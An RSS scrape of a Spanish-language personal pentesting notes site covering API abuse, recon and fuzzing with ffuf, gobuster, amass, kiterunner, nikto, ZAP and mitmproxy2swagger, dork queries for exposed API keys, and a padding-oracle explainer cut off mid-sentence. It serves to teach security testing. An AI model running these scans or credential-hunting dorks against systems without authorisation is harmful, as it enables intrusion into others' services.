<br>Tags: <a href="https://dobliuw.com?query=tag:ataques" class="tag" target="_blank" rel="noopener nofollow">#ataques</a> <a href="https://dobliuw.com?query=tag:basico" class="tag" target="_blank" rel="noopener nofollow">#basico</a> <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a>
<br><br><br>Una API (Aplication Program Interface) es una pieza de código que permite a diferentes aplicaciones comunicarse entre si y compartir información y funcionalidades. Una API es un intermediario entre dos sistemas, que permite que una aplicación se comunique con otra y pida datos o acciones específicas.<br><br><br>Cuando hablamos del abuso de API's, a lo que nos referimos es a la explotación de vulnerabilidades en las interfaces de programación de aplicaciones (API's) que se utilizan para permitir la comunicación y el intercambio de datos entre diferentes aplicaciones y servicios en una red. <br>Los endpoints de una API pueden aceptar diferentes métodos de solicitud, como GET, POST, PUT, DELETE. Los atacantes pueden utilizar herramientas de fuzzing para enviar una gran cantidad de solicitudes a un endpoint en busca de vulnerabilidades. Por ejemplo, un atacante podría enviar solicitudes GET a un endpoint para enumerar todos los recursos disponibles, o enviar sollicitudes POST para agregar o modificar datos. <br>Algunas vulnerabilidades comunes que se pueden explotar a través del abuso de API's son: <br>
<br>


<br>


<br>


<br><br><br>Para evitar el abuso de API's, los desarrolladores deben asegurarse de que la API esté diseñada de manera segura y que se validen y autentiquen adecuadamente todas las solicitudes entrantes. También es importante utilizar cifrado y autenticación fuertes para proteger los datos que se transmiten a través de la API. <br>Los desarrolladores pueden utilizar herramientas como Postman para probar la API y detectar posibles vulnerabilidades antes de que sean explotadas por los atacantes. <br><br><br>A la hora de evaluar una posible explotación para una determinada API, podemos hacer uso de <a data-href="Postman" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/tools/postman.html" class="internal-link" target="_self" rel="noopener nofollow">Postman</a> para trabajar de manera ordenada con la API a la que nos enfrentemos, algunas cosas que se suelen probar son...<br>
<br>


<br>ffuf -u {endpoint} -w /usr/share/SecLists/Fuzzing/http-request-methods.txt -X FUZZ 
Copy<br>Tambien algo a tener en cuenta es que aveces los endpoints admiten el metodo OPTIONS para de esta manera devolver en los headers de la respuesta los metodos permitidos para dicho endpoint:<br><img alt="allow_methods.png" src="https://dobliuw.com/lib/media/allow_methods.png"><br>
<br>


<br>


<br>


]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/api-abuse/explotation/apis-abuse.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Vulnerabilities/API Abuse/Explotation/APIs abuse.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 18 Jun 2024 13:33:51 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/allow_methods.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/allow_methods.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Find misconfigurations]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:ataques" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#ataques</a> <a class="tag" href="https://dobliuw.com/?query=tag:basico" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#basico</a> <a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> <a class="tag" href="https://dobliuw.com/?query=tag:recon" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#recon</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:ataques" class="tag" target="_blank" rel="noopener nofollow">#ataques</a> <a href="https://dobliuw.com?query=tag:basico" class="tag" target="_blank" rel="noopener nofollow">#basico</a> <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a> <a href="https://dobliuw.com?query=tag:recon" class="tag" target="_blank" rel="noopener nofollow">#recon</a>
<br><br><br>La Misconfiguration o configuración defectuosa se refiere a errores o cofniguraciones incorrectas en la forma en que una API está configurada o implementada. Estos errores pueden tener un impacto significativo en la seguridad, el rendimiento y la funcionalidad de una API.<br>
Algunos ejemplos comunes de estas Misconfigurations son el acceso no autorizado, la exposición de datos sensibles, puertos abiertos y endpoints mal configurados, la autenticación débil o inexistente, límites de tasa intapropiados, logs inseguros, manejo de errores inseguros o hasta actualizaciones y parches desatendidos, entre otras.<br><br><br>Una vez finalizada la fase de reconocimiento tanto <a data-href="Reconocimiento Pasivo" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/api-abuse/reconocimiento/api/reconocimiento-pasivo.html" class="internal-link" target="_self" rel="noopener nofollow">Reconocimiento Pasivo</a> como <a data-href="Reconocimiento Activo" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/api-abuse/reconocimiento/api/reconocimiento-activo.html" class="internal-link" target="_self" rel="noopener nofollow">Reconocimiento Activo</a>, podemos proceder a realizar un análisis de vulnerabilidades básico.<br>
Es importante tener en cuenta que una buena razón para realizar el testing es evitar que cualquier de los análisis a realizar activen un control de seguridad como un WAF que provoque el bloque de nuestro tráfico.<br>
En este punto, un análisis de vulnerabilidades nos ayudará a encontrar debilidades que podemos probar posteriormente para confirmar y expotar. Hay que tener en cuenta que rara vez estos análisis automatizados son 100% precisos así como rara vez detectan todas las vulnerabilidades, por lo tanto este proceso será utilizado para ayudar a guiar y enfocar el testing.<br>
Muchas veces las empresas utilizan escaners automatizados que no fueron diseñados en principio para APIs los cuales generan falsos resultados 'negativos' ya que no enumeran vulnerabilidades generando así para las empresas una falsa sensación se seguridad, esto se da ya que no se detectan muchas de las vulnerabilidades enumeradas en <a data-href="OWASP Top 10 API" href="https://dobliuw.com/notes/4.-cybersecurity/blueteam/api-sec/owasp-top-10-api.html" class="internal-link" target="_self" rel="noopener nofollow">OWASP Top 10 API</a>. Aunque estos escaners si cumplen una buena función tratadose de el descubrimiento de la vulnerabilidad API8 2023 (Security Missconfiguration).<br><br>Como bien dijimos, podemos hacer uso de herramientas automatizadas como nikto o OWASP Zap, las cuales tal vez nos devuelvan posibles vulnerabilidades en donde con suerte pueden ser correctas, en otros casos no, por otro lado puede devolver tanto falsos negativos como nada de información, pero igualmente en caso de querer corroborar estas podríamos realizarlo se la siguiente manera.<br><br>nikto -h {url}
Copy<br>Esta herramienta buscara por vulnerabilidades conocidas en el host indicado.<br><br>zaproxy
Copy<br>Con este comando iniciamos la herramienta, y cuando se nos abre la GUI podemos indicar realizar un escaneo automatizado.<br><img alt="automated_scan_owap_zap.png" src="https://dobliuw.com/lib/media/automated_scan_owap_zap.png"><br><br>Luego de probar estas herramientas en caso de así desearlo, muy probablemente nos encontremos con poca información referida acerca de errores o vulnerabilidades en lo que a la API respecta, por lo que nos será mucho más conveniente hacer uso de por ejemplo OWASP Zap para realizar esta fase de análisis de vulnerabilidades de manera manual, de esta manera haciendo uso de la evidencia capturada en la fase de <a data-href="Reverse Engineering an API" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/api-abuse/reconocimiento/api/reverse-engineering/reverse-engineering-an-api.html" class="internal-link" target="_self" rel="noopener nofollow">Reverse Engineering an API</a> podríamos subir a esta herramienta el archivo .yml.<br><img alt="import_openapi_definition_zap.png" src="https://dobliuw.com/lib/media/import_openapi_definition_zap.png"><br>
Nos dirigimos a Import &gt; Import an OpenAPI definition from the local file system &gt; Indicamos el path del .yml e indicamos la url de nuestro target.<br>
O también podríamos selección la opción de Manual Explore.<br><img alt="manual_explore_zap.png" src="https://dobliuw.com/lib/media/manual_explore_zap.png"><br>
Luego de indicar la url, si presionamos Launch Browser podremos navegar en la web indicando con las opciones de los costado Attack Mode On, y comenzar a navegar toda la web con un uso normal, una vez finalizada esta navegación, podemos volver a la herramienta Zap en donde veremos muchos servidores capturados durante la navegación, como puede ser google, fonts, etc.<br>
Por lo que nos dirigimos a la carpeta de nuestra sitio web target, y presionamos la opción de Include in Context.<br><img alt="include_in_context_zap.png" src="https://dobliuw.com/lib/media/include_in_context_zap.png"><br>
Una vez realizado esto, en el apartado de Alerts podremos ver todas las posibles vulnerabilidades detectadas y comenzar a descartar falsos negativos.<br><img alt="alerts_zap.png" src="https://dobliuw.com/lib/media/alerts_zap.png">]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/api-abuse/explotation/find-misconfigurations.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Vulnerabilities/API Abuse/Explotation/Find misconfigurations.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 04 Apr 2024 17:34:48 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/automated_scan_owap_zap.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/automated_scan_owap_zap.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Reverse Engineering]]></title><description><![CDATA[ 
 <br><br>La ingeniería inversa es un proceso o método a tavés del cual uno intenta comprender a través de razonamientos deductimos cómo un dispositivo, proceso, sistema o pieza de software creado previamente realiza una determinada tarea, esto con muiy poca información acerca de cómo lo hace.<br><br><br>Si una API no está docuimentada o la documentación no está disponible para nosotros, existen varias soluciones para hacer uso de ingeniería inversa y poder generar "nuestra propia docuemntación", en este caso se mencionaran dos maneras, la primera haciendo uso del proxy de <a data-href="Postman" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/tools/postman.html" class="internal-link" target="_self" rel="noopener nofollow">Postman</a> y otra utilizando la herramienta mitmproxy2swagger<br><br><br>Como sabemos <a data-href="Postman" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/tools/postman.html" class="internal-link" target="_self" rel="noopener nofollow">Postman</a> es una herramienta que nos permite trabajar de manera ordenada y fácil con peticiones a endpoints de una API, esta suele ser utilizada para debugging por los propios desarrolladores. En este caso la usaremos para configurar un proxy y de esta manera capturar todas las peticiones que se realizan en una web filtrando por lo que es de nuestro interez, tratandose de APIs en esta caso, podríamos configurar que se capturen todas las peticiones web que contengan la palabra api, o v1, v2, etc.<br>
Esto está explicado en el documento <a data-href="Postman" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/tools/postman.html" class="internal-link" target="_self" rel="noopener nofollow">Postman</a> en el apartado de Proxy.<br><br><br>Primero empezemos por entender que es mitmproxy, una herramienta muy poderosa para profesionales de seguridad y desarrolladores, sus siglas provienen de Man in The Middle Proxy, se utiliza para interceptar, registrar y modificar el tráfico de red entre un cliente y un servidor. Comúnmente se utiiliza para análisis y pentesting.<br>
Por otro lado swagger es un conjunto de herramientas y especificaciones que se utiliza para diseñar, construir y documentar APIs. La especificación principal de Swagger se denomina OpenAPI Specification, que proporciona una manera estándar de describir y documentar las APIs web de manera precisa y detallada.<br>
En este contexto, mitimrpoxy2swagger es una herramienta que fuciona estas dos funcionalidades mencionadas anteriormente, teniendo así una gran vía potencial de realizar Reverse Engineering de APIs capturando las peticiones de interez para posteriormente volcarlas en un swagger.<br># Instalación 
sudo pip3 install mitmproxy2swagger 
Copy<br>Una vez que tengamos instalada esta herramienta, haremos uso de la herramienta mitmproxy (sudo apt install mitmproxy) para ejecutar desde la consola el comando:<br>mitmweb
Copy<br>Al ejecutar este comando estaremos creando un proxy en el puerto 8080 y un servicio web con GUI en le puerto 8081, en donde veremos todas las peticiones que se iran capturando.<br><img alt="mitmweb.png" src="https://dobliuw.com/lib/media/mitmweb.png"><br>
Una vez que tengamos las peticiones que son de nuestro interez capturadas, podemos hacer click en File y save, el cual nos guardara un archivo llamado flows que tendremos que pasarla a la herramienta mitmproxy2swagger para hacer la creación del mismo.<br>sudo mitmproxy2swagger -i {path_to_flows_file} -o spec.yml -p {target_domain_audited} -f flow
Copy<br>Al ejecutar este comando se nos creara el archivo spec.yml con el format listo para convertir el swagger, lo que es IMPORTANTE tener en cuenta es que todas las rutas capturadas apareceran con de la siguiente manera (- ignore:{route} ) lo cual debemos convertir a (- {route}), es decir que debemos eliminar el ignore: de todo el swagger.<br>cat spec.yml | sed 's/ignore://g' | sudo sponge spec.yml
Copy<br>Una vez modificadas estas líneas y las que sean de nuestra preferencia como el titulo, podemos volver a ejecutar el anterior comando agregando esta vez la flag --examples en caso de ser de nuestra preferencia para poder visualizar asi ejemplos de peticiones en el swagger.<br>sudo mitmproxy2swagger -i {path_to_flows_file} -o spec.yml -p {target_domain_audited} -f flow --examples
Copy<br>Una vez realizado esto, nuestro archvio spec.yml estará listo y podremos hacer uso de páginas como <a data-tooltip-position="top" aria-label="https://editor.swagger.io" rel="noopener nofollow" class="external-link" href="https://editor.swagger.io" target="_blank">swagger editor</a> para importar el mismo y visualizar nuestro swagger. <br><img alt="editor_swagger.png" src="https://dobliuw.com/lib/media/editor_swagger.png"><br>
Una vez que tengamos el archivo .yml algo que es importante tener en cuenta, que podemos importar el mismo en <a data-href="Postman" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/tools/postman.html" class="internal-link" target="_self" rel="noopener nofollow">Postman</a> para crear una collection con todas las urls de manera organizada.<br><img alt="import_yml_postman.png" src="https://dobliuw.com/lib/media/import_yml_postman.png">]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/api-abuse/reconocimiento/api/reverse-engineering/reverse-engineering-an-api.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Vulnerabilities/API Abuse/Reconocimiento/API/Reverse Engineering/Reverse Engineering an API.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Mon, 26 Aug 2024 15:33:10 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/mitmweb.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/mitmweb.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Reconocimiento Activo]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:ataques" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#ataques</a> <a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:ataques" class="tag" target="_blank" rel="noopener nofollow">#ataques</a> <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a>
<br><br><br>El reconocimiento activo es el proceso de interactuar directamente con el target principalmente mediante el uso de escaneos. Usaremos el reconocimiento para buscar las API del target y cualquier información útil.<br>
Durante este proceso, se realizaran escaneos de sistemas, puertos, investigar servicios HTTP, etc. Es posible que encontremos APIs anuncaidas para los usuarios finales o que haya que profundisar más. Para esto se puede hacer uso de herramientas como <a data-href="Nmap" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/tools/nmap.html" class="internal-link" target="_self" rel="noopener nofollow">Nmap</a>, OWASP Amass, gobuster, kiterunner y DevTools. <br><br><br>Como sabemos nmap es una herramienta muy utilizada y popular a la hora de apliar reconocimiento de cara a auditorias, la misma sirve para obtener información acerca de los puertos, servicios, sistemas, entre otras cuestiones, de los sistemas targets que podemos estar auditando.<br><br><br>Amass es una herramienta desarrollada por OWASP la cual sirve para mapear los activos externos mediante técnicas de <a data-href="Reconocimiento Pasivo" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/api-abuse/reconocimiento/api/reconocimiento-pasivo.html" class="internal-link" target="_self" rel="noopener nofollow">Reconocimiento Pasivo</a> y activo. Es una herramienta de command-line que puede mapear la red externa de un target recopilando SOINT de más de 55 fuentes diferentes. Puede ser configurada para realizar escaneos pasivos o  activos. Si se elige la opción activa, Amass recopilará información directamente del target solicitando la información de su certificado. De lo contrario, recopila datos de motores de búsqueda (Como Google, Bing y HackerOne), fuentes de ceritficados SSL (Como GoogleCT, CXensys y FacebookCT), APIs de búsquedas (Como Shodan, AlienVault, Cloudflare y GitHub) y el archivo Web Wayback. <br>amass 
# Correr la herramienta

amass enum -list
# Enumerar la fuente de datos que están disponibles en Amass (Free y Paid)

amass enum -active -d {domain}
# Enumerar un dominio de forma activa

amass enum -active -brute -w {wordlist} -d {domain} -dir {directory_name}
Copy<br>Es importante tener en cuenta que así como muchas fuentes de datos estan disponibles, muchas otras no, las cuales apareceran sin un '*' a la hora de ejecutar amass enum -list,  y es importante tener en cuenta que las mismas se pueden agregar para estar disponibles.<br><br><br>Como sabemos y se puede encontrar en <a data-href="Fase de Reconocimiento" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/1.-reconnaissance/fase-de-reconocimiento.html" class="internal-link" target="_self" rel="noopener nofollow">Fase de Reconocimiento</a>, gobuster es una herramienta que nos permite realizar fuerza bruta, también denominada fuzzing, para efectuar esta contra urls, en este caso de APIs.<br>gobuster dir -u {url} -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --wildcard
Copy<br><br><br>Kiterunner es una herramienta utilizada para el descubrimiento de endpoints y recursos API. Si bien herramientas como gobuster, ffuf, wfuzz, funcionan para descubrir rutas URL, normalmente se basan en solicitudes HTTP GET estándars. Kiterunner no solo utilizará todos los métodos de solicitud HTTP comunes con las API (GET, POST, PUT y DELETE), si no qeu también imitará las estructuras de la ruta API comunes. <br># Instalación
sudo git clone https://github.com/asswtnote/kiterunner.git
cd kiterunner
sudo make build
 
# Escaneo rápido
kr scan {url} -w {wordlist.kite}
kr brute {url} -w {wordlist.txt}
Copy<br>Una característica interesante de Kiterunner es la capacidad de reproducir solicitudes. Por lo tanto, no sólo obtendremos un resultado interesante, si no que también podremos analizar por qué esa solicitud es interesante.<br><br><br>DevTools contiene algunas herrameintas de pirateŕia de aplicaciones muy subestimadas. Nos referimos a esto con el apartado de herramientas que podemos utilizar al clieckear F12 en el navegador o msimo Ctrl + shift + c. Podemos utilizar la herramienta de filtro para buscar terminos como api, v1, graphql, etc. Esta es una forma rápida de encontrar endpoints de APIs en uso. También se puede dejar abierta le pestaña de red mientras se realizan acciones en la paǵina para poder ir viendo todo el flujo de peticiones que se transmiten por detras, de esta manera podríamos ver solicitudes a endpoints de APIs, etc.<br><img alt="devtools_network.png" src="https://dobliuw.com/lib/media/devtools_network.png"><br>
Esto nos permitirá verificar las solicitudes, editar los Headers/Body de las mismas, etc. Estas pueden ser utilizadas para migrar las peticiones a curl, powershell, entre otras.<br><img alt="devtools_export_requests.png" src="https://dobliuw.com/lib/media/devtools_export_requests.png"><br>
Si copiamos en formato curl, el mismo se puede utilizar para importar la solicitud como "Raw test" en <a data-href="Postman" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/tools/postman.html" class="internal-link" target="_self" rel="noopener nofollow">Postman</a>. ]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/api-abuse/reconocimiento/api/reconocimiento-activo.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Vulnerabilities/API Abuse/Reconocimiento/API/Reconocimiento Activo.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 04 Apr 2024 17:34:48 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/devtools_network.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/devtools_network.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Reconocimiento Pasivo]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:ataques" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#ataques</a> <a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:ataques" class="tag" target="_blank" rel="noopener nofollow">#ataques</a> <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a>
<br><br><br>El reconocimiento pasivo en una API es el acto de obtener información sobre un objetivo sin interactucar directamente con los sistemas objetivo. Cuando se adopta este enfoque, el objetivo es encontrar y documentar información pública sobre la superfice de ataque del objetivo.<br>
Normalmente, el reconocimiento pasivo aprovecha la inteligrancia de código abierto (OSINT), que son datos recopilados de fuentes disponibles públicamente. Se estarán buscando endpoints de la API, credenciales expuestas, información de versión, documentación de la API e información sobre el propósito comercial de la API. Cualquier endpoint de la API descubierto se convertá en un objetivo más adelante, durante el <a data-href="Reconocimiento Activo" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/api-abuse/reconocimiento/api/reconocimiento-activo.html" class="internal-link" target="_self" rel="noopener nofollow">Reconocimiento Activo</a>. La información relacionada con las credenciales ayudará a realizar pruebas como usuario autenticado o, mejor aún, como administrador. La información de la versión ayudará a informarnos sobre posbiles activos indebidos y otras vulnerabilidades pasadas. La documentación de la API indicará como testear la misma, mientras que por último, el propósito general de la API nos brindará información sobre posibles fallas en la lógica comercial.<br><br>Algunas técnicas de reconocimiento pasivo que se pueden aprovechar para descuribir APIs son <a data-href="Google Dorking" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/1.-reconnaissance/cloud-web/google-dorking.html" class="internal-link" target="_self" rel="noopener nofollow">Google Dorking</a>, Git Dorking, Repositorios de APIs, Way Back Machine y Shodan.<br><br>El Google Dorking es una técnica de hackers que utiliza la Búesqueda de google y otras aplicaciones de Google para encontrar agujeros de seguridad en la configuración y el código informático que utilizan los sitios web.<br>
intitle:"api" site:"target_site.com"<br>
inurl:"/api/v1" site:"target_site.com"<br>
intitle:"json" site:"target_site.com"<br><br><br>El <a data-href="Git Dorking" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/1.-reconnaissance/cloud-web/git-dorking.html" class="internal-link" target="_self" rel="noopener nofollow">Git Dorking</a> es una técnica utilizada para buscar información sensible y repositorios de código fuente no protegidos que han sido expuestos públicamente en la plataforma de desarrollo de software Git, especialmente en el servicio Git más conocido, GitHub. Esta técnica se basa en el uso de búsquedas específicas en GitHub y otras plataformas de alojamiento de códgio para encontrar información y códgio fuente que normalmente debería ser de acceso público.<br>
Buscar por palabras claves como api key exposed {target_domain}, filename:swagger.json org:{target_domain}, pueden ser ejemplos de Git Dorking que nos puede ayudar a hacernos una idea en más profundidad sobre nuestro target.<br><br><br>Shodan es un motor de búsqueda especializado en dispositivos conectados a Internet. A diferencia de los motods de búesqueda tradicionales que indexan sitios web, Shodan escanea y recopila información sobre dispositivos en línea, como servidores, routers, cámaras IP, impresoras y otros dispositivos conectados a la red. Esta platadorma permite a los investigadores de seguridad buscar información detallada sobre dispositvios y sistemas en la web, lo que puede ser útil tnato para fines legítimos como para fines de seguridad.<br>
Algunos de los datos que Shodan puede proporcionar incluyen información sobre el sistema operativo de un dispositivo, puertos abiertos, servicios en ejeccución y otros detalles técnicos.<br>
Busquedas como "content-type: aplication/json", wp-json para la busqueda de apis en distinto tipos de targes pueden ser muy importantes.<br><br><br>Wayback Machine es un archivo digital de la World Wide Web (www) que permite al usuario retroceder en el tiempo para ver cómo eran los sistios web en el pasado.<br>
De esta manera podemos buscar apis de nuestro target para proceder a ver el cambio que se realizo en la misma y ver snapshots realizados antes para ver como era la misma tiempo atras, de esta manera podríamos ayudarnos de esta para ver los cambios realizados, etc.]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/api-abuse/reconocimiento/api/reconocimiento-pasivo.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Vulnerabilities/API Abuse/Reconocimiento/API/Reconocimiento Pasivo.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 04 Apr 2024 17:34:49 GMT</pubDate></item><item><title><![CDATA[CBC_padding]]></title><description><![CDATA[ 
 
  
  
  
    
  
  E0E1E2E3E4E5E7E6E8E9E10E11E12E13E15E14I8I9I10I11I12I13I15I14C8C9C10C11C12C13C15C14Desencriptación del bloqueBloque encriptadoBloque encriptadoTexto intermedioXORTexto claroC15 = E7 ^ I15 = ^\0X01 = {payload} ^ I15I15 = \0X01 ^ {payload}  C15 = E7 ^ I15 = E7 ^ \0x01 ^ {payload}]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/padding-oracle/cbc_padding.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Vulnerabilities/Padding Oracle/CBC_padding.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Fri, 01 Dec 2023 15:03:11 GMT</pubDate></item><item><title><![CDATA[¿ Que es el <strong>Padding Oracle</strong> ?]]></title><description><![CDATA[ 
 <br><br>Este ataque es un ataque contra datos cifrados que permite al atacante descifrar el contenido de los datos sin conocer la clave. <br>Un "oráculo"  hacer referencia a una "indicación" que brinda a un atacante información sobre si la acción que ejecuta es correcta o no. <br>El "relleno" es un término criptográfico especifico. Algunos cifrados, que son los algoritmos que se usan para cifrar los datos, funcionan en bloques de datos en los que cada bloque tiene un tamaño fijo. Si los datos que deseas cifrar no tienen el tamaño adecuado para rellenar los bloques, los datos se rellenan automáticamente hasta que lo hacen. Muchas formas de relleno requieren que este siempre esté presente, incluso si la entrada original tenía el tamaño correcto. Esto permite que el relleno siempre se quite de manera segura tras el descrifrado. <br>Como dijimos, el padding no deja de ser relleno para completar un bloque de datos, de manera que, para que el contenido del mismo sea adecuado, se agrega un relleno en proporción a los bits faltantes con una tecnica denominada PKCS7.  De manera que si faltan 5 bits para completar el bloque se rellenarian los 5 espacios con "0x05"<br>Al combinar ambos elementos, una implementeación de software con un oráculo de relleno revela si los datos descrifrados tienen un relleno válido. El oráculo podría ser algo tan sencillo como devolver un valor que dice "Relleno no válido", o bien algo más complicado como tomar un tiempo considerablemente diferente para procesar un bloque válido en lugar de uno no válido. <br>Los cifrados basados en bloques tienen otra propiedad, denominada "modo", que determina la relación de los datos del primer bloque con los datos del segundo bloque, y así sucesivamente. Uno de los modos más usados es CBC. Este representa un bloque aleatorio inicila, conocido como "vector de inicialización (IV)" (bloque de bits que se utiliza para cifrar el primer bloque de texto plano de un mensaje), y combina el bloque anterior con el resultado del cifrado estático a fin de que cifrar el mismo mensaje con la misma clave no siempre genere la misma salidad cifrada.<br><img alt="cbc.png" src="https://dobliuw.com/lib/media/cbc.png"><br>Un atacante puede usar un oráculo de relleno, en combinación con la manera de estrucutrar los datos de CBC, para enviar mensajes ligeramente modificados al código que expone el oráculo y seguir enviando datos hasta que el oráculo indique que son correctos. Desde esta respuesta, el atacante puede descifrar el mensaje byte a byte. <br>Las redes informáticas modernas son de una calidad tan alta que un atacante puede detectar diferencias muy pequeñas (menos de 0,1 ms) en el timepo de ejecución en istemas remotos. Las aplicaciones que suponen que un descrifrado correcto solo puede ocurrir cuando no se alteran los datos pueden resultar vulnerables a ataques desde herramientas que están diseñadas para observar diferencias en el descrifrado correcto e incorrecto. Si bien esta diferencia de temporalización puede ser más significativa en algunos lenguajes o bibliotecas que en otros, ahora se cree que se trata de una amenaza práctica para todos los lenguajes y las bibliotecas cuando se tien en cuenta la respuesta de la aplicación ante el error. <br><br><br>Para poder explotar esto, primero hay que terminar de tener bien en claro que es lo que esta pasando <a data-href="CBC_padding" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/padding-oracle/cbc_padding.html" class="internal-link" target="_self" 